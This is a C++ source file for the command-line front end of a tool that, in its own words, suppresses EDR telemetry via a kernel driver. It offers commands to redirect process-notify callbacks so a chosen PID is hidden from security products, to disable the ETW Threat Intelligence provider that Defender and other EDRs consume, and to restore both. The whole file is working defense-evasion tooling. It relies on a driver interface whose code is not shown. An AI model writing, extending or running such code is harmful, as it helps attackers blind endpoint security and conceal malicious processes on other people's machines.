#include <print>
#include <memory>
#include <string>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Suppress EDR telemetry via kernel driver.

Description:
  Disables kernel-level telemetry sources used by EDR products.
  Supports redirecting Ps*Notify callbacks to hide a specific PID
  and disabling the ETW Threat Intelligence provider.

Usage:
  {0} redirect <pid>       Redirect callbacks to hide a process
  {0} restore-callbacks    Restore redirected callbacks
  {0} suppress-etw         Disable ETW Threat Intelligence provider
  {0} restore-etw          Restore ETW TI provider
  {0} --help               Show this help

Arguments:
  pid             Process ID to hide from callback consumers

Details:
  Callback redirection replaces Ps*Notify function pointers with a
  filter that suppresses notifications for the specified PID while
  forwarding all other notifications to the original callbacks.

  ETW TI suppression zeroes the ProviderEnableInfo field in the
  ETW Threat Intelligence provider registration, disabling all TI
  events consumed by Defender and third-party EDRs.

  Both are data-only modifications (no code patching, HVCI-safe).

Examples:
  {0} redirect 1234          Hide PID 1234 from all notify callbacks
  {0} restore-callbacks      Undo callback redirection
  {0} suppress-etw           Disable ETW TI telemetry
  {0} restore-etw            Re-enable ETW TI telemetry
)", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	const auto cmd = std::string_view{ argv[1] };

	if( cmd == "redirect" )
	{
		if( argc < 3 )
		{
			std::println( "[!] Usage: {} redirect <pid>", argv[0] );
			return 1;
		}

		const auto pid = static_cast< DWORD >( std::stoul( argv[2] ) );

		if( auto count = driver->redirect_callbacks( pid ) )
			std::println( "[+] Redirected {} callbacks. PID {} is now hidden.", *count, pid );
		else
		{
			std::println( "[!] Failed to redirect callbacks." );
			return 1;
		}
	}
	else if( cmd == "restore-callbacks" )
	{
		if( driver->restore_callbacks() )
			std::println( "[+] Restored all notify callbacks to original state." );
		else
		{
			std::println( "[!] Failed to restore callbacks." );
			return 1;
		}
	}
	else if( cmd == "suppress-etw" )
	{
		if( auto prev = driver->suppress_etw_ti() )
			std::println( "[+] ETW TI provider disabled. Previous value: 0x{:X}.", *prev );
		else
		{
			std::println( "[!] Failed to suppress ETW TI." );
			return 1;
		}
	}
	else if( cmd == "restore-etw" )
	{
		if( driver->restore_etw_ti() )
			std::println( "[+] ETW TI provider restored." );
		else
		{
			std::println( "[!] Failed to restore ETW TI." );
			return 1;
		}
	}
	else
	{
		std::println( "[!] Unknown command '{}'. Use --help for usage.", cmd );
		return 1;
	}

	return 0;
}
